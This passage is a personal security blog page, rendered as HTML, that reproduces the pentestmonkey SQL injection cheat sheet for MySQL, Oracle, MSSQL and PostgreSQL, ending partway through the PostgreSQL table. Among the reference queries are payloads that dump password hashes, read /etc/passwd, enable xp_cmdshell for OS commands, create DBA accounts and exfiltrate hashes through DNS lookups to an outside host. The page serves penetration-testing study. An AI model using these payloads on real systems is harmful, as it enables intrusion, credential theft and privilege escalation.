@@ -1,0 +1,1594 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="KageHayashi" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      SQL Injection 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/takeda_white_small.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SQL Injection</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          1111-11-11 11:11:11
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>Most of this is taken from pentestmonkey (<a target="_blank" rel="noopener" href="https://pentestmonkey.net/category/cheat-sheet/sql-injection">https://pentestmonkey.net/category/cheat-sheet/sql-injection</a>)</p>
+<h2 id="MySQL-Injection"><a href="#MySQL-Injection" class="headerlink" title="MySQL Injection"></a>MySQL Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT @@version</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 1; #comment<br>
+SELECT /*comment*/1;</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT user();<br>
+SELECT system_user();</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>SELECT user FROM mysql.user; — priv</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>SELECT host, user, password FROM mysql.user; — priv</td>
+</tr>
+<tr>
+<td>Password Cracker</td>
+<td><a target="_blank" rel="noopener" href="http://www.openwall.com/john/">John the Ripper</a> will crack MySQL password hashes.</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT database()</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT schema_name FROM information_schema.schemata; — for MySQL &gt;= v5.0<br>
+SELECT distinct(db) FROM mysql.db — priv</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0<br>
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT substr(‘abcd’, 3, 1); # returns c</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>SELECT 6 &amp; 2; # returns 2<br>
+SELECT 6 &amp; 1; # returns 0</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>SELECT char(65); # returns A</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>SELECT ascii(‘A’); # returns 65</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT cast(‘1’ AS unsigned integer);<br>
+SELECT cast(‘123’ AS char);</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT CONCAT(‘A’,’B’); #returns AB<br>
+SELECT CONCAT(‘A’,’B’,’C’); # returns ABC</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>SELECT if(1=1,’foo’,’bar’); — returns ‘foo’</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>SELECT 0x414243; # returns ABC</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td><span>SELECT BENCHMARK(1000000,MD5(‘A’));<br>
+SELECT SLEEP(5); # &gt;= 5.0.12<br>
+</span></td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>Impossible?</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>If mysqld (&lt;5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).&nbsp; The .so file should contain a User Defined Function (UDF).&nbsp; <a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">raptor_udf.c</a> explains exactly how you go about this.&nbsp; Remember to compile for the target architecture which may or may not be the same as your attack platform.</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’) — priv, can only read world-readable files.<br>
+SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT @@hostname;</td>
+</tr>
+<tr>
+<td>Create Users</td>
+<td>CREATE USER test1 IDENTIFIED BY ‘pass1’; — priv</td>
+</tr>
+<tr>
+<td>Delete Users</td>
+<td>DROP USER test1; — priv</td>
+</tr>
+<tr>
+<td>Make User DBA</td>
+<td>GRANT ALL PRIVILEGES ON *.* TO test1@’%’; — priv</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>SELECT @@datadir;</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>information_schema (&gt;= mysql 5.0)<br>
+mysql</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="Oracle-Injection"><a href="#Oracle-Injection" class="headerlink" title="Oracle Injection"></a>Oracle Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>
+SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>
+SELECT version FROM v$instance;</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 1 FROM dual — comment<br>
+— NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT user FROM dual</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>SELECT username FROM all_users ORDER BY username;<br>
+SELECT name FROM sys.user$; — priv</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g.&nbsp; astatus tells you if acct is locked<br>
+SELECT name,spare4 FROM sys.user$ — priv, 11g</td>
+</tr>
+<tr>
+<td>&nbsp;Password Cracker</td>
+<td><a target="_blank" rel="noopener" href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>SELECT * FROM session_privs; — current privs<br>
+SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs<br>
+SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv<br>
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT global_name FROM global_name;<br>
+SELECT name FROM v$database;<br>
+SELECT instance_name FROM v$instance;<br>
+SELECT SYS.DATABASE_NAME FROM DUAL;</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>
+— Also query TNS listener for other databases.&nbsp; See <a target="_blank" rel="noopener" href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>
+SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>SELECT table_name FROM all_tables;<br>
+SELECT owner, table_name FROM all_tables;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>SELECT bitand(6,2) FROM dual; — returns 2<br>
+SELECT bitand(6,1) FROM dual; — returns0</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>SELECT chr(65) FROM dual; — returns A</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>SELECT ascii(‘A’) FROM dual; — returns 65</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT CAST(1 AS char) FROM dual;<br>
+SELECT CAST(‘1’ AS int) FROM dual;</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT ‘A’ || ‘B’ FROM dual; — returns AB</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br>
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>SELECT chr(65) || chr(66) FROM dual; — returns AB</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br>
+SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — if reverse looks are slow<br>
+SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow<br>
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow<br>
+— Also see <a target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<br>
+SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to execute commands if it’s installed. <a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a> can sometimes be used too, though it normally failed for me.</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td><a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.&nbsp; Check that the following is non-null:<br>
+SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a target="_blank" rel="noopener" href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT UTL_INADDR.get_host_name FROM dual;<br>
+SELECT host_name FROM v$instance;<br>
+SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br>
+SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — gets hostnames</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>SELECT name FROM V$DATAFILE;</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>SYSTEM<br>
+SYSAUX</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="MSSQL-Injection"><a href="#MSSQL-Injection" class="headerlink" title="MSSQL Injection"></a>MSSQL Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT @@version</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 1 — comment<br>
+SELECT /*comment*/1</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT user_name();<br>
+SELECT system_user;<br>
+SELECT user;<br>
+SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>SELECT name FROM master..syslogins</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>SELECT name, password FROM master..sysxlogins — priv, mssql 2000;<br>
+SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins — priv, mssql 2000.&nbsp; Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br>
+SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;<br>
+SELECT name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005</td>
+</tr>
+<tr>
+<td>&nbsp;Password Cracker</td>
+<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.&nbsp; <a target="_blank" rel="noopener" href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>— current privs on a particular object in 2005, 2008<br>
+SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database<br>
+SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server<br>
+SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table<br>
+SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);<p></p>
+<p>–permissions on a user– current privs in 2005, 2008<br>
+SELECT is_srvrolemember(‘sysadmin’);<br>
+SELECT is_srvrolemember(‘dbcreator’);<br>
+SELECT is_srvrolemember(‘bulkadmin’);<br>
+SELECT is_srvrolemember(‘diskadmin’);<br>
+SELECT is_srvrolemember(‘processadmin’);<br>
+SELECT is_srvrolemember(‘serveradmin’);<br>
+SELECT is_srvrolemember(‘setupadmin’);<br>
+SELECT is_srvrolemember(‘securityadmin’);</p>
+<p>— who has a particular priv? 2005, 2008<br>
+SELECT name FROM master..syslogins WHERE denylogin = 0;<br>
+SELECT name FROM master..syslogins WHERE hasaccess = 1;<br>
+SELECT name FROM master..syslogins WHERE isntname = 0;<br>
+SELECT name FROM master..syslogins WHERE isntgroup = 0;<br>
+SELECT name FROM master..syslogins WHERE sysadmin = 1;<br>
+SELECT name FROM master..syslogins WHERE securityadmin = 1;<br>
+SELECT name FROM master..syslogins WHERE serveradmin = 1;<br>
+SELECT name FROM master..syslogins WHERE setupadmin = 1;<br>
+SELECT name FROM master..syslogins WHERE processadmin = 1;<br>
+SELECT name FROM master..syslogins WHERE diskadmin = 1;<br>
+SELECT name FROM master..syslogins WHERE dbcreator = 1;<br>
+SELECT name FROM master..syslogins WHERE bulkadmin = 1;</p></td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?&nbsp; returns 1 for true, 0 for false, NULL for invalid role.&nbsp; Also try ‘bulkadmin’, ‘systemadmin’ and other values from the <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br>
+</a> SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br>
+SELECT name FROM&nbsp;master..syslogins WHERE sysadmin = ‘1’ — tested on 2005</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT DB_NAME()</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT name FROM master..sysdatabases;<br>
+SELECT DB_NAME(N); — for N = 0, 1, 2, …</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only<br>
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views<br>
+SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;<br>
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>— NB: This example works only for the current database.&nbsp; If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br>
+SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT substring(‘abcd’, 3, 1) — returns c</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>SELECT 6 &amp; 2 — returns 2<br>
+SELECT 6 &amp; 1 — returns 0</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>SELECT char(0x41) — returns A</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>SELECT ascii(‘A’) – returns 65</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT CAST(‘1’ as int);<br>
+SELECT CAST(1 as char)</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT ‘A’ + ‘B’ – returns AB</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1</span></td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>SELECT char(65)+char(66) — returns AB</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>&nbsp;WAITFOR DELAY ‘0:0:5’ — pause for 5 seconds</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.&nbsp; Messy but necessary.<br>
+— Also check out theDNS tunnel feature of <a target="_blank" rel="noopener" href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:<br>
+EXEC sp_configure ‘show advanced options’, 1; — priv<br>
+RECONFIGURE; — priv<br>
+EXEC sp_configure ‘xp_cmdshell’, 1; — priv<br>
+RECONFIGURE; — priv</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>CREATE TABLE mydata (line varchar(8000));<br>
+BULK INSERT mydata FROM ‘c:boot.ini’;<br>
+DROP TABLE mydata;</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT HOST_NAME()</td>
+</tr>
+<tr>
+<td>Create Users</td>
+<td>EXEC <a target="_blank" rel="noopener" href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> ‘user’, ‘pass’; — priv</td>
+</tr>
+<tr>
+<td>Drop Users</td>
+<td>EXEC <a target="_blank" rel="noopener" href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> ‘user’; — priv</td>
+</tr>
+<tr>
+<td>Make User DBA</td>
+<td>EXEC <a target="_blank" rel="noopener" href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> ‘user’, ‘sysadmin; — priv</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>EXEC sp_helpdb master; –location of master.mdf<br>
+EXEC sp_helpdb pubs; –location of pubs.mdf</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>northwind<br>
+model<br>
+msdb<br>
+pubs — not on sql server 2005<br>
+tempdb</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="PostgreSQL-Injection"><a href="#PostgreSQL-Injection" class="headerlink" title="PostgreSQL Injection"></a>PostgreSQL Injection</h2><table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT version()</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 1; –comment<br>
+SELECT /*comment*/1;</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT user;<br>
+SELECT current_user;<br>
+SELECT session_user;<br>
+SELECT usename FROM pg_user;<br>
+SELECT getpgusername();</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>SELECT usename FROM pg_user</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>SELECT usename, passwd FROM pg_shadow — priv</td>
+</tr>
+<tr>
+<td>Password Cracker</td>
+<td><a target="_blank" rel="noopener" href="http://pentestmonkey.net/blog/cracking-postgres-hashes/">MDCrack</a> can crack PostgreSQL’s MD5-based passwords.</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT current_database()</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT datname FROM pg_database</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r’) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; — rows numbered from 0<br>
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT substr(‘abcd’, 3, 1); — returns c</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>SELECT 6 &amp; 2; — returns 2<br>
+SELECT 6 &amp; 1; –returns 0</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>SELECT chr(65);</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>SELECT ascii(‘A’);</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT CAST(1 as varchar);<br>
+SELECT CAST(‘1’ as int);</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT ‘A’ || ‘B’; — returnsAB</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>IF statements only seem valid inside functions, so aren’t much use for SQL injection.&nbsp; See CASE statement instead.</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>SELECT CHR(65)||CHR(66); — returns AB</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>SELECT pg_sleep(10); — postgres 8.2+ only<br>
+CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6’, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function.&nbsp; Taken from <a target="_blank" rel="noopener" href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">here</a> .</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
